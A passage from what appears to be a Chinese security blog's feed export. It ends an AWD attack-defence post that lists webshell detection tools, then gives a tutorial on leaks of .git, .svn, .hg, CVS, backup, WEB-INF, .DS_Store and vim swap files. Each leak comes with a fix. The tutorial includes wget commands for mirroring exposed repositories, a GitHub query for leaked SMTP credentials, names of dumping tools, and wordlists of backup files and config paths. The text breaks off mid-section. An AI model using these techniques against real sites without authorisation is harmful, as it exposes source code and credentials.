href="https://www.cnblogs.com/pureqh/p/10869327.html">https://www.cnblogs.com/pureqh/p/10869327.html</a></li></ul><p><strong>案例2：防守-扫描后门-实现第一时间利用预留后门攻击-升级脚本版</strong></p><p>最快第一时间操作，此类技术核心在于扫描源码中预留或隐藏后门(源码语言)</p><p>10款常见的Webshell检测工具</p><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款Webshll检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种WebShell检测能力，比如阿里云、青藤云、safedog等，本文暂不讨论。</p><p>1、D盾_Web查杀</p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p><p>兼容性：只提供Windows版本。</p><p>工具下载地址：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p>2、百度WEBDIR+</p><p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p>3、河马</p><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持Windows、linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p><p>4、Web Shell Detector</p><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p><p>兼容性：提供php&#x2F;python脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p>5、CloudWalker（牧云）</p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性，提供linux版本，Windows 暂不支持。</p><p>在线查杀demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn/</a></p><p>github项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p>6、Sangfor WebShellKill</p><p>Sangfor WebShellKill(网站后门检测工具)是一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p>7、深度学习模型检测PHP Webshell</p><p>一个深度学习PHP webshell查杀引擎demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a></p><p>8、PHP Malware Finder</p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供linux版本，Windows 暂不支持。</p><p>github项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p>9、findWebshell</p><p>这个项目是一款基于python开发的webshell检查工具，可以根据特征码匹配检查任意类型的webshell后门。</p><p>github项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>10、在线webshell查杀工具</p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p>参考：<a href="https://www.cnblogs.com/xiaozi/p/12679777.html">https://www.cnblogs.com/xiaozi/p/12679777.html</a></p><p><strong>案例3：防守-代码审计-实现第一时间找出源码中安全漏洞-升级漏洞库版</strong></p><p>最快第一时间操作，简要分析可能存在的安全问题，配合流量监控及代码审计后续操作(框架及非框架，源码语言，漏洞库等)进行漏洞判定</p><p>推荐2款工具，尽快审计源码：Seay源代码审计系统、Fortify。</p><p><strong>案例4：防守-文件监控-实现第一时间监控当前目录文件操作-升级流量监控</strong></p><p>最快第一时间操作，在防守攻击时，实时监控当前目录文件上传删除等操作，有效防止恶意删除、上传后门等，后续可配合流量操作行为监控找出更多漏洞</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80-3.png" alt="80-1"></p><p><strong>案例5：攻击-批量Flag-实现第一时间利用脚本批量 Flag 得分-升级模版不死马</strong></p><p>攻击第一时间操作，写好批量获取 Flag 脚本后，预定 Flag 更新时间，实现自动获取及提交，升级后门写入及不死马等操作，实现权限维持实时获取得分</p><p>假设分析脚本，发现一个后门，针对这个后门，可以批量写脚本。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80-4.png" alt="80-1"></p><p>批量获取并提交flag脚本：</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80-5.png" alt="80-1"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;80-红蓝对抗-AWD模式&amp;amp;准备&amp;amp;攻防&amp;amp;监控&amp;amp;批量&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>文件泄露</title>
    <link href="http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2023-05-17T10:08:14.108Z</published>
    <updated>2023-05-18T14:34:00.793Z</updated>
    
    <content type="html"><![CDATA[<p>信息泄露</p><span id="more"></span><p>文件泄露介绍</p><p>提到信息泄露大家应该都不陌生了，现在有太多的信息泄露，可能在某些人眼里这已经不算什么了。但是信息泄露确是很严重的问题，这可不只泄露你一个人的信息那么简单，可能表面上只泄露你一个人的信息，实际上你全家人的信息都被扒出来了，而且泄露的信息包括你的身份证、家庭住址等敏感信息。</p><p>但是接下来会介绍的不是关于人的敏感信息，而是网站的敏感信息，就是一些重要文件泄露、源码泄露等。</p><h2 id="一、版本管理软件造成的泄露"><a href="#一、版本管理软件造成的泄露" class="headerlink" title="一、版本管理软件造成的泄露"></a>一、版本管理软件造成的泄露</h2><h3 id="1、git-泄露"><a href="#1、git-泄露" class="headerlink" title="1、git 泄露"></a>1、git 泄露</h3><p>（1）漏洞产生</p><p>Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、所有该项目的源代码</span><br><span class="line">2、私有仓库的地址</span><br><span class="line">3、私密的配置信息</span><br><span class="line">4、所有commiter的邮箱帐号信息</span><br><span class="line">5、（可能）内部的帐号和密码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>常规的利用方法就是下载整个目录, 然后用git命令回滚整个项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">2、cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：GitHack、dvcs-ripper、scrabble</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、GitHack</span><br><span class="line">github项目地址：https://github.com/lijiejie/GitHack</span><br><span class="line"></span><br><span class="line">2、dvcs-ripper：基于perl的工具，除了git还支持很多版本管理系统</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"></span><br><span class="line">3、scrabble</span><br><span class="line">github项目地址：</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、UC某业务导致敏感内部邮件信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091525</span><br><span class="line">2、高德软件多个信息泄露，影响公司安全：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094921</span><br><span class="line">3、陌陌某重要应用源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086227</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、删除.git目录。</span><br><span class="line">2、修改中间件配置进行对.git隐藏文件夹的访问。</span><br></pre></td></tr></table></figure><h3 id="2、svn-源码泄露"><a href="#2、svn-源码泄露" class="headerlink" title="2、svn 源码泄露"></a>2、svn 源码泄露</h3><p>（1）漏洞产生</p><p>svn 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为 .svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用 “导出” 功能，而是直接复制代码文件夹到 WEB 服务器上，这就使 .svn 隐藏文件夹被暴露于外网环境，可以利用 <code>.svn/entries</code> 文件，获取到服务器源码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）所有该项目的源代码</span><br><span class="line">（2）svn仓库的地址</span><br><span class="line">（3）svn仓库所属用户的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>同样是先下载目录, 然后回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">（2）cd www.example.com &amp;&amp; svn revert --recursive</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：Seay-SVN、dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper: 支持旧版和新版的svn</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"> </span><br><span class="line">（2）Seay-Svn: 法师的工具，基于Windows平台</span><br><span class="line">下载地址：https://www.vuln.cn/2225</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）淘宝网某应用svn信息导致代码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-012665</span><br><span class="line">（2）新浪某服务器svn源码泄露可SQL影响海量用户数据：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0199607</span><br><span class="line">（3）中国联通整站配置不当导致SVN源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0169147</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）删除web目录中所有.svn隐藏文件夹。</span><br><span class="line">（2）开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。</span><br></pre></td></tr></table></figure><h3 id="3、hg-源码泄露"><a href="#3、hg-源码泄露" class="headerlink" title="3、hg 源码泄露"></a>3、hg 源码泄露</h3><p>（1）漏洞产生</p><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成 .hg 。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）项目源代码</span><br><span class="line">（2）项目仓库地址</span><br><span class="line">（3）（可能）仓库的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>手动利用，下载+回滚：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">（2）cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除.hg文件。</span><br></pre></td></tr></table></figure><h3 id="4、cvs-泄露"><a href="#4、cvs-泄露" class="headerlink" title="4、cvs 泄露"></a>4、cvs 泄露</h3><p>（1）漏洞产生</p><p>CVS 是一个 C&#x2F;S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root 以及 CVS&#x2F;Entries 目录，直接就可以看到泄露的信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为是纯客户端的工具，所以只会泄露源代码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理。</span><br><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">（2）cd www.example.com &amp;&amp; cvs diff \*</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）华为某系统CVS信息泄漏：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-081481</span><br><span class="line">（2）国泰君安某重要分站CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0136373</span><br><span class="line">（3）易宝支付某站多处CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0109755</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除cvs文件。</span><br></pre></td></tr></table></figure><h3 id="5、Bazaar-x2F-bzr泄露"><a href="#5、Bazaar-x2F-bzr泄露" class="headerlink" title="5、Bazaar&#x2F;bzr泄露"></a>5、Bazaar&#x2F;bzr泄露</h3><p>（1）漏洞产生</p><p>bzr也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面，bzr在初始化项目时(bzr init&#x2F;init-repo)，会在项目根目录产生名为.bzr的隐藏目录，同样暴露了源代码和用户信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）源代码</span><br><span class="line">（2）仓库地址</span><br><span class="line">（3）开发者的信息</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>没用过bzr工具, 不过查询文档得知可用bzr revert命令来进行回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">（2）cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同git。</span><br></pre></td></tr></table></figure><h3 id="6、github-源码泄漏"><a href="#6、github-源码泄漏" class="headerlink" title="6、github 源码泄漏"></a>6、github 源码泄漏</h3><p>（1）漏洞产生</p><p>GitHub 是一个面向开源及私有软件项目的托管平台。很多人喜欢把自己的代码上传到平台托管，通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。类似的代码托管平台还有很多，人才是最大的漏洞。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+&lt;span&gt;@qq.com&lt;/span&gt;&amp;type=code</span><br></pre></td></tr></table></figure><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）咕咚网github信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0177720</span><br><span class="line">（2）一个github引发的畅捷通渗透测试：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0164337</span><br><span class="line">（3）Github Hack之环球运费网代码泄露（审计发现安全漏洞）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0152208</span><br></pre></td></tr></table></figure><h3 id="7、前端泄露"><a href="#7、前端泄露" class="headerlink" title="7、前端泄露"></a>7、前端泄露</h3><p>源代码泄露，在 ctf 中常见于签到题，一般叫你右键查看源代码就可以看到 flag 了，有时候他不让你右键，那么就按 F12 来查看，那万一 F12 也不让呢？那就在地址前加一个 <code>view-source:</code> 即可，或者是 <code>ctrl+s</code> 保存网页的前端代码到本地以文本形式打开查看。</p><p>（1）漏洞产生</p><p>由于程序员的失误导致在前端的注释没有删除，会显示在页面上。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、右键源代码查看</span><br><span class="line">2、F12 查看</span><br><span class="line">3、地址前加 view-source:</span><br><span class="line">4、ctrl+s 文本打开查看</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除注释。</p><br><h2 id="二、文件包含导致的泄露"><a href="#二、文件包含导致的泄露" class="headerlink" title="二、文件包含导致的泄露"></a>二、文件包含导致的泄露</h2><h3 id="1、网站备份压缩文件"><a href="#1、网站备份压缩文件" class="headerlink" title="1、网站备份压缩文件"></a>1、网站备份压缩文件</h3><p>（1）漏洞产生</p><p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似 tar -czvf bakup.tgz 的命令将网站进行备份, 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,  如 vim 的 .swp , 从而泄露了该网页的源代码。</p><p>（2）漏洞利用</p><p>对于打包文件而言，渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站，说不定会有意外惊喜。对于网页的临时备份文件，可以扫描对应页面的 .swp 或者 .bak 等后缀，说不定也能找到有用的信息。</p><p>（3）漏洞工具：御剑、dirsearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dirsearch</span><br><span class="line">github项目地址：https://github.com/maurosoria/dirsearch</span><br><span class="line"></span><br><span class="line">（2）御剑</span><br><span class="line">下载地址：https://pan.baidu.com/share/init?surl=Bn7GtWb7AStcjzVahFOjSQ?passwd=zkaq</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）广州医科大学某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0225610</span><br><span class="line">（2）起点中文网某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0170753</span><br><span class="line">（3）奥凯航空任意用户登陆/敏感信息泄露/内部文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0158981</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>做好版本管理，并利用版本管理工具过滤掉这些类型的文件，同时不要直接在生产环境中修改或者添加文件。</p><p>（6）常见的压缩文件及备份文件后缀名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">压缩文件：</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar.gz</span><br><span class="line"></span><br><span class="line">备份文件后缀名：</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.swp</span><br><span class="line">.swo</span><br><span class="line">.~</span><br><span class="line">.bak</span><br><span class="line">.bash_history</span><br><span class="line">.bkf</span><br></pre></td></tr></table></figure><h3 id="2、WEB-INF-x2F-web-xml-泄露"><a href="#2、WEB-INF-x2F-web-xml-泄露" class="headerlink" title="2、WEB-INF&#x2F;web.xml 泄露"></a>2、WEB-INF&#x2F;web.xml 泄露</h3><p>（2）漏洞产生</p><p>&lt;1&gt; 在 Java 的 Servlet 文档中，说到 WEB-INF 目录“包含了所有 web 应用会用到但是不处于 web 路径中的资源”，也就是说，WEB-INF 目录下的内容是不属于公开页面的。web 应用可以通过 getResource 等 API 在 servlet 的上下文中访问到这些资源。</p><p>&lt;2&gt; 通常开发者会把许多 JSP 文件，Jar 包，Java 的类文件放在该目录下。一般目录的内容都是可以预测的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">2、WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">3、WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">4、WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">5、WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><p>（2）漏洞利用</p><p>通过 web.xml 文件推测应用组件相关类的名字，然后在 src 目录下查找代码，如果没有源代码可以直接下载 class 文件反编译即可。</p><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）傲世堂官网WEB-INF目录文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-029022</span><br><span class="line">（2）华为官网WEB-INF目录配置文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-022906</span><br><span class="line">（3）某政府网站WEB-INF目录读取到Getshell：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-068399</span><br></pre></td></tr></table></figure><p>（4）漏洞修复</p><p>发布前确认WEB-INF目录是禁止访问的, 或者在server设置好对于的过滤规则。</p><h3 id="3、DS-Store-文件泄露"><a href="#3、DS-Store-文件泄露" class="headerlink" title="3、DS_Store 文件泄露"></a>3、DS_Store 文件泄露</h3><p>（1）漏洞产生</p><p>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将 .DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>（2）漏洞利用</p><p>.DS_Store 的格式为二进制，内部数据结构为Proprietary格式，可以自行解析并递归下载所有文件，参考 lijiejie 的 ds_store_exp 。</p><p>（3）漏洞利用工具：ds_store_exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）ds_store_exp</span><br><span class="line">github项目地址：https://github.com/lijiejie/ds_store_exp</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）西北大学SQL注入+DS_Store信息泄露+git信息泄露+HP打印机未授权访问：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0167033</span><br><span class="line">（2）Camera360多各分站服务器配置不当导致未授权访问（DS_Store泄密）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095996</span><br><span class="line">（3）TCL某网站DS_Store文件泄露敏感信息（谨慎使用Mac系统）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091869</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>使用 macOS 开发的同学，可以把 .DS_Store 加入忽略列表中(如 .gitignore )，但本质上其只是泄露目录结构，就算删掉 .DS_Store ，文件也依然存在于 web 服务器可以访问得到的地方，所以治本的方法还是不要将敏感信息放在 web 路径中。</p><h3 id="4、Vim-文件泄露"><a href="#4、Vim-文件泄露" class="headerlink" title="4、Vim 文件泄露"></a>4、Vim 文件泄露</h3><p>（1）漏洞产生</p><p>swp 即 swap 文件，在用 vim 编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果第一次意外退出就会保留，文件名为 .filename.swp；第二次意外退出就会生成文件名为 .filename.swo 的文件。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接访问 .swp 文件，下载回来后删掉末尾的.swp，获得源码文件。</span><br><span class="line"></span><br><span class="line">2、直接访问 .swo 文件，下载回来后删掉末尾的.swo，获得源码文件。</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除 .swp 或者是 .swo 文件。</p><br><h2 id="三、配置文件的泄露"><a href="#三、配置文件的泄露" class="headerlink" title="三、配置文件的泄露"></a>三、配置文件的泄露</h2><h3 id="1、配置文件泄露"><a href="#1、配置文件泄露" class="headerlink" title="1、配置文件泄露"></a>1、配置文件泄露</h3><p>（1）漏洞产生</p><p>现代WEB开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p><p>（2）漏洞利用</p><p>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好常见的配置文件路径，如 wordpress 的 <code>/wp-config.php</code> 等，组织成字典然后用脚本进行批量测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以参考猪猪侠的字典：https://github.com/ring04h/weakfilescan/blob/b1a3066e3fdcd60b8ecf635526f49cb5ad603064/dict/configfile.lst</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>修改配置文件的默认路径，同时在服务器端阻止对这些路径的访问。</p><h3 id="2、配置错误导致的泄露"><a href="#2、配置错误导致的泄露" class="headerlink" title="2、配置错误导致的泄露"></a>2、配置错误导致的泄露</h3><p>（1）Windows IIS&#x2F;Apache 